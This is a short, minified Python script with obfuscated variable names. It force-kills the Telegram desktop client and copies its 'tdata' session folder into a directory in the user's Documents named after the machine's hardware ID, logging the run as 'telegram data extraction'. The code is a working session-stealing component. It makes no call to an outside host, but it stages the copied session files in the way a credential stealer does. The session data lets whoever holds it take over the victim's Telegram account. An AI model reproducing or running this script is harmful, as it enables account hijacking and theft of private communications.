import os,shutil,logging,psutil,time
process_names={'telegram':'telegram.exe'}
def kill_process_by_name(process_name):
	'Kill all processes matching the given process name.';D='name';C='pid';A=process_name
	for B in psutil.process_iter(attrs=[C,D]):
		if B.info[D].lower()==A.lower():
			try:psutil.Process(B.info[C]).terminate();print(f"Terminated process: {A} (PID: {B.info[C]})")
			except psutil.NoSuchProcess:print(f"Process {A} no longer exists.")
			except psutil.AccessDenied:print(f"Access denied to terminate {A}.")
			except Exception as E:print(f"Error terminating {A}: {E}")
def kill_specified_processes(processes,max_attempts=5,delay=0):
	'Kill all specified processes from the given dictionary with retries.'
	for B in range(max_attempts):
		for A in processes.values():kill_process_by_name(A)
		time.sleep(delay)
kill_specified_processes(process_names)
logging.basicConfig(filename='telegram_data_extraction.log',level=logging.INFO,format='%(asctime)s - %(levelname)s - %(message)s')
telegram_path=os.path.join(os.getenv('APPDATA'),'Telegram Desktop','tdata')
def get_hwid():import uuid;return str(uuid.getnode())
def find_folder_by_hwid(base_path,hwid):
	A=base_path
	try:
		for B in os.listdir(A):
			C=os.path.join(A,B)
			if os.path.isdir(C)and B==hwid:return C
	except FileNotFoundError as D:logging.error(f"Base path not found: {A}")
def copy_telegram_data(source_path,dest_folder):
	A=source_path
	try:
		if os.path.exists(A):
			B=os.path.join(dest_folder,'tdata')
			if not os.path.exists(B):shutil.copytree(A,B,dirs_exist_ok=True)
			logging.info(f"Copied Telegram data from {A} to {B}")
		else:logging.warning(f"Source path does not exist: {A}")
	except(PermissionError,OSError)as C:logging.error(f"Error copying Telegram data from {A} to {B}: {C}")
def main():
	B=get_hwid();C=os.path.join(os.getenv('USERPROFILE'),'Documents');A=find_folder_by_hwid(C,B)
	if not A:
		A=os.path.join(C,B)
		if not os.path.exists(A):os.makedirs(A)
	copy_telegram_data(telegram_path,A);logging.info('Telegram data extraction completed.')
if __name__=='__main__':main()